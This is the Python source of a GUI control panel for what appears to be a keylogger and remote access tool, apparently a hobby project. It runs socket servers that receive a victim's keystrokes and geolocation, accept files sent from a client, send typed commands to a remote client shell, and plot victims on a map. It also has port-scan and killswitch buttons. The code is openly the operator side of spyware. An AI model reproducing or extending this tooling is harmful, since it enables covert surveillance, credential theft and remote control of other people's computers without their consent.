import customtkinter
import tkinter
import threading
import socket
import tkintermapview
import subprocess
import time
import pickle
import os

class App(customtkinter.CTk):
    SERVER_SOCKETS= [] 
    USER_GEOLOCATIONS= []

    def __init__(self):
        super().__init__()
               
        self.title("Cool app")
        self.geometry("1000x500")

        # create 2x2 grid system
        self.grid_rowconfigure(0, weight=1)
        self.grid_columnconfigure((0, 3), weight=1)

  
        ############################################################################################
        #                                        UI design                                         #
        ############################################################################################
        #! Right Frame: Live Keylogger update
        self.frame = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=600)
        self.frame.grid(row=0, column=3, sticky="ne")

         # Text Box 
        self.textbox = customtkinter.CTkTextbox(master=self.frame, width=200, height=500)
        self.textbox.grid(row=0, column=2,sticky="nsew")
        
        # create CTk scrollbar
        self.ctk_textbox_scrollbar = customtkinter.CTkScrollbar(self.frame,width=17, height=500, command=self.textbox.yview)
        self.ctk_textbox_scrollbar.grid(row=0, column=3,sticky="nw")
        
        # connect textbox scroll event to CTk scrollbar
        self.textbox.configure(yscrollcommand=self.ctk_textbox_scrollbar.set)
        
        
        #! Left Frame: Navigation Buttons
        self.frame1 = customtkinter.CTkFrame(master=self,
                               width=200,
                               height=500)
        self.frame1.grid(row=0, column=0, sticky="w")
        
        # Buttons
        self.button = customtkinter.CTkButton(master=self.frame1, text="Killswitch", command=lambda: self.killswitch(self.SERVER_SOCKETS[0]))
        self.button.grid(row=0, column=0, pady =10,sticky="n")
      
        self.button = customtkinter.CTkButton(master=self.frame1, command=self.startPortScan, text="Port Scan")
        self.button.grid(row=1, column=0, pady =10,sticky="n")

        self.button = customtkinter.CTkButton(master=self.frame1, command=self.openMapLevel,text="Geolocation")
        self.button.grid(row=2, column=0, pady =10,sticky="n")     

        self.button = customtkinter.CTkButton(master=self.frame1, command=self.showFiles,text="Files")
        self.button.grid(row=3, column=0, pady =10, sticky="n")
        
        #! Center Frame: Main content/command line
        self.frame2 = customtkinter.CTkFrame(master=self,
                               width=600,
                               height=500)
        self.frame2.grid(row=0, column=2, sticky="s")

        self.entry = customtkinter.CTkEntry(master=self.frame2,
                               placeholder_text="CTkEntry",
                               width=400,
                               height=50,
                               border_width=2,
                               corner_radius=10)
        self.entry.grid(row=2, column=1, sticky="s")

        self.button = customtkinter.CTkButton(master=self.frame2,height=25, command=self.send_to_client,text="Submit")
        self.button.grid(row=2, column=2,padx = 10, sticky="nw")
        
        ###########################################################################################
        #                                        System                                           #
        ###########################################################################################
        #? KEYLOGGER SOCKET
        def startSocket():
            t2 = threading.Thread(target=createKeylogSocket)
            t2.daemon = True
            t2.start()
            print("Server started the keylog socket.")

        def createKeylogSocket():
            HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
            PORT = 65432  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                print("KEYLOGGER: Listening for Keylog clients.")
                s.listen()
                conn, addr = s.accept()
                with conn:
                    print(f"KEYLOGGER: Connected by {addr}")
                    # Recieve geo data before key logging
                    self.USER_GEOLOCATIONS.append(conn.recv(24).decode("utf-8"))
                    self.textbox.insert("0.0", f"{self.USER_GEOLOCATIONS}\n")
                    while True:
                        data = conn.recv(1024).decode("utf-8") 
                        self.textbox.insert("0.0", f"{data[1:-1]}\n") 
                        #print(data)
        startSocket()
        
        #? FILE_TRANSFER SOCKET
        def start_file_name_socket():
            t4 = threading.Thread(target=create_file_name_socket)
            t4.daemon = True
            t4.start()
            print("DICT_TRANSFER: Server started.")

        def create_file_name_socket():
            HOST = "127.0.0.2"  # Standard loopback interface address (localhost)
            PORT = 65433  # Port to listen on (non-privileged ports are > 1023)
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                # Add the server socket to a list
                self.SERVER_SOCKETS.append(s)
                # Continue
                s.bind((HOST, PORT))
                print("DICT_TRANSFER: Listening for clients.")
                s.listen()
                conn, addr = s.accept()
                
                # Accept the pickle list and print it
                with conn:
                    print(f"DICT_TRANSFER: Connected by {addr}")
                    data = conn.recv(1024)
                    data = pickle.loads(data)
                    print(data)

        def start_file_transfer_socket():
            t5 = threading.Thread(target=create_file_transfer_socket)
            t5.daemon = True
            t5.start()
            print("FILE_TRANSFER: Server started.")

        def create_file_transfer_socket():
            HOST = "127.0.0.4"
            PORT = 65434
            
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.bind((HOST, PORT))
                s.listen()
                while True:
                    conn, addr = s.accept()

                    while True:
                        msg = conn.recv(1024).decode("utf-8")
                        cmd, data = msg.split(":")

                        if cmd == "FILENAME":
                            new_file = open(data, "w")
                            print("Created File")
                        elif cmd == "DATA":
                            new_file.write(data)
                            print("Writing Data")
                        elif cmd == "FINISH":
                            new_file.close()
                            print("Finished writing data")
                        elif cmd == "CLOSE":
                            conn.close()
                            break
            
        start_file_name_socket()
        start_file_transfer_socket()

        #! CLI SOCKET SEGMENT
        def start_CLI_socket():
            t3 = threading.Thread(target=create_CLI_socket)
            t3.daemon = True
            t3.start()

        def create_CLI_socket():
            global cli
            HOST = "127.0.0.1"  # Standard loopback interface address (localhost)
            PORT = 12345  # Port to listen on (non-privileged ports are > 1023)

            #? This makes sure that we dont loose connection for too long
            def wake_up():
                wake_tries = 0
                time.sleep(10)
                try:
                    cli.connect((HOST,PORT))
                    print("CLI: Success: Established new CLI connection.")
                    wake_tries = 0
                except Exception as e: print(f"Thrown Exception CLI_Wake_Up: {e}") 
                
                #? After 10 minutes of no connection kill the socket
                wake_tries+=1
                if wake_tries >= 60:
                    print("CLI_Error: Chosen client is offline, terminating socket.")
                    cli.close()

            # Start  CLI socket
            while True:
                time.sleep(3)
                try:    
                    cli = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    cli.connect((HOST,PORT))
                    print("CLI_Success: Connected to CLI client.")
                    break
                except Exception as e: print(f"Thrown Exception CLI: {e}")
                wake_up()

        start_CLI_socket()    
    ############################################################################################
    #                                        Functions                                         #
    ############################################################################################
    def send_to_client(self):
        global cli
        data = self.entry.get()
        cli.send(bytes(f"{data}", "utf-8"))
        print(f"Sent: {data}, to Client")
            
    def showFiles(self):
        subprocess.Popen('explorer "Data"')         
    
    def killswitch(self):
        try:
            for socket in self.SERVER_SOCKETS:
                socket.shutdown(socket.SHUT_RDWR)
                socket.close()
            print("KILLSWITCH: Succsesfully shutdown all connections.")
        except:
            print("KILLSWITCH_Error: Socket shutdown. Prob no sockets to close.")
    
    # TODO show the open ports in the textbox
    def openScanner(self):
        import portscaner
        print(str(self.SERVER_SOCKETS))
        portscaner.scan_ports("127.0.0.1", 70)
        print(portscaner.OPEN_PORTS)

    def startPortScan(self):
        portThread = threading.Thread(target=self.openScanner)
        portThread.daemon = True
        portThread.start()
    
    def openMapLevel(self):
        # create tkinter window
        def create_geoTopLevel():
            root_tk = customtkinter.CTkToplevel(self)
            root_tk.geometry("800x600")
            root_tk.title("Location mapping.")

            # create map widget
            map_widget = tkintermapview.TkinterMapView(root_tk, width=800, height=600, corner_radius=0)
            map_widget.place(relx=0.5, rely=0.5, anchor=tkinter.CENTER)
            try:
                map_widget.set_address(f"{self.USER_GEOLOCATIONS}")
            except:
                map_widget.set_address("colosseo, rome, italy")

        geoThread = threading.Thread(target=create_geoTopLevel)
        geoThread.daemon = True
        geoThread.start()
        
    
# Run dze up
app = App()
app.mainloop()
